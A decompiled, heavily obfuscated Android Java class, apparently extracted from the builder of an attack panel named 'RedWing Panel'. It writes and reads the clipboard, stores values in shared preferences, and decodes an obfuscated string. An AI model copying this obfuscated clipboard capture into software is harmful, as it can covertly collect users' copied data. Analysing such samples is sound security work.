package v.s;

import android.content.ClipData;
import android.content.ClipboardManager;
import app.mobilex.plus.services.SyncQYAdapter;
import app.mobilex.plus.util.TypefaceCache;
import java.io.Serializable;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class kpn9InmXMPkXCuK9 extends jh03IwKTfxTtT1U implements NhN5GSKLYh6STld4 {
    public final /* synthetic */ Serializable b1EoSIRjJHO5;
    public final /* synthetic */ SyncQYAdapter ibVTtJUNfrGYbW;
    public final /* synthetic */ int xDyLpEZyrcKVe0;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public /* synthetic */ kpn9InmXMPkXCuK9(SyncQYAdapter syncQYAdapter, Serializable serializable, b9xRoaXFR1fmOO2Q b9xroaxfr1fmoo2q, int i) {
        super(2, b9xroaxfr1fmoo2q);
        this.xDyLpEZyrcKVe0 = i;
        this.ibVTtJUNfrGYbW = syncQYAdapter;
        this.b1EoSIRjJHO5 = serializable;
    }

    private static /* synthetic */ void vstcpuxwmy() {
    }

    @Override // v.s.NhN5GSKLYh6STld4
    public final Object b1EoSIRjJHO5(Object obj, Object obj2) {
        wh3Lv6S5rs6zqjV wh3lv6s5rs6zqjv = (wh3Lv6S5rs6zqjV) obj;
        b9xRoaXFR1fmOO2Q b9xroaxfr1fmoo2q = (b9xRoaXFR1fmOO2Q) obj2;
        switch (this.xDyLpEZyrcKVe0) {
            case 0:
                kpn9InmXMPkXCuK9 kpn9inmxmpkxcuk9 = (kpn9InmXMPkXCuK9) dDIMxZXP1V8HdM(wh3lv6s5rs6zqjv, b9xroaxfr1fmoo2q);
                Eo0e0FTdv96U7KeCzoB eo0e0FTdv96U7KeCzoB = Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
                kpn9inmxmpkxcuk9.vekpFI4d1Nc4fakF(eo0e0FTdv96U7KeCzoB);
                return eo0e0FTdv96U7KeCzoB;
            case 1:
                kpn9InmXMPkXCuK9 kpn9inmxmpkxcuk10 = (kpn9InmXMPkXCuK9) dDIMxZXP1V8HdM(wh3lv6s5rs6zqjv, b9xroaxfr1fmoo2q);
                Eo0e0FTdv96U7KeCzoB eo0e0FTdv96U7KeCzoB2 = Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
                kpn9inmxmpkxcuk10.vekpFI4d1Nc4fakF(eo0e0FTdv96U7KeCzoB2);
                return eo0e0FTdv96U7KeCzoB2;
            default:
                kpn9InmXMPkXCuK9 kpn9inmxmpkxcuk11 = (kpn9InmXMPkXCuK9) dDIMxZXP1V8HdM(wh3lv6s5rs6zqjv, b9xroaxfr1fmoo2q);
                Eo0e0FTdv96U7KeCzoB eo0e0FTdv96U7KeCzoB3 = Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
                kpn9inmxmpkxcuk11.vekpFI4d1Nc4fakF(eo0e0FTdv96U7KeCzoB3);
                return eo0e0FTdv96U7KeCzoB3;
        }
    }

    @Override // v.s.CWIOrUfHtKyaxQib0W
    public final b9xRoaXFR1fmOO2Q dDIMxZXP1V8HdM(Object obj, b9xRoaXFR1fmOO2Q b9xroaxfr1fmoo2q) {
        switch (this.xDyLpEZyrcKVe0) {
            case 0:
                return new kpn9InmXMPkXCuK9(this.ibVTtJUNfrGYbW, (String) this.b1EoSIRjJHO5, b9xroaxfr1fmoo2q, 0);
            case 1:
                return new kpn9InmXMPkXCuK9(this.ibVTtJUNfrGYbW, (String) this.b1EoSIRjJHO5, b9xroaxfr1fmoo2q, 1);
            default:
                return new kpn9InmXMPkXCuK9(this.ibVTtJUNfrGYbW, (aqjfZUF02xH6w) this.b1EoSIRjJHO5, b9xroaxfr1fmoo2q, 2);
        }
    }

    @Override // v.s.CWIOrUfHtKyaxQib0W
    public final Object vekpFI4d1Nc4fakF(Object obj) {
        String string;
        ClipData.Item itemAt;
        CharSequence text;
        switch (this.xDyLpEZyrcKVe0) {
            case 0:
                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                ((ClipboardManager) this.ibVTtJUNfrGYbW.getApplicationContext().getSystemService("clipboard")).setPrimaryClip(ClipData.newPlainText("rw", (String) this.b1EoSIRjJHO5));
                break;
            case 1:
                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                String str = (String) this.b1EoSIRjJHO5;
                String str2 = SyncQYAdapter.A1BaTVAMeIXMnh;
                SyncQYAdapter syncQYAdapter = this.ibVTtJUNfrGYbW;
                syncQYAdapter.getSharedPreferences(str2, 0).edit().putString(SyncQYAdapter.qfTrc75xwRVMl85vh, str).putBoolean(SyncQYAdapter.euF5Udt5Rqv3Qmea, true).putString(SyncQYAdapter.MSGkxvPxRYNqC, syncQYAdapter.vekpFI4d1Nc4fakF).apply();
                TypefaceCache.obtain("0013007E0054008900F500FF00DC00B2002E0074005E009500B000AC00D300B100260072001B009300FF00FF00C200B5002600700048");
                break;
            default:
                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                ClipboardManager clipboardManager = (ClipboardManager) this.ibVTtJUNfrGYbW.getApplicationContext().getSystemService("clipboard");
                aqjfZUF02xH6w aqjfzuf02xh6w = (aqjfZUF02xH6w) this.b1EoSIRjJHO5;
                ClipData primaryClip = clipboardManager.getPrimaryClip();
                if (primaryClip == null || (itemAt = primaryClip.getItemAt(0)) == null || (text = itemAt.getText()) == null || (string = text.toString()) == null) {
                    string = "";
                }
                aqjfzuf02xh6w.w9sT1Swbhx3hs = string;
                break;
        }
        return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
    }
}
